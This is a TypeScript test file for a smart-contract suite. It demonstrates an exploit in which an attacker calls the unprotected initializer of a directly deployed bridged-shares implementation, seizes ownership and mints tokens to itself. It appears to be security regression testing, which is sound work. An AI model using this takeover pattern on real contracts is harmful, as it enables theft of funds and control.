import { expect } from "chai";
import { Contract } from "ethers";
import { ethers, owner, signer1 } from "../../TestBase.ts";

describe("Proxy and upgrade safety", function () {
  it("EXPLOIT: a directly deployed initializer-enabled bridged implementation can be taken over", async function () {
    const Bridged = await ethers.getContractFactory(
      "contracts/multichain/BridgedSharesUnderAgreement.sol:BridgedSharesUnderAgreement"
    );
    const bridged = (await Bridged.deploy(
      "BSS",
      "Bridged Shares",
      "https://terms.example",
      owner
    )) as unknown as Contract;
    await bridged.waitForDeployment();

    const attacker = await signer1.getAddress();
    await bridged
      .connect(signer1)
      .initialize("PWN", "Taken Over", "https://attacker.example", attacker);

    expect(await bridged.owner()).to.equal(attacker);
    expect(await bridged.symbol()).to.equal("PWN");

    await bridged.connect(signer1).setPool(attacker);
    await bridged.connect(signer1).mint(attacker, 100n);
    expect(await bridged.balanceOf(attacker)).to.equal(100n);
  });
});
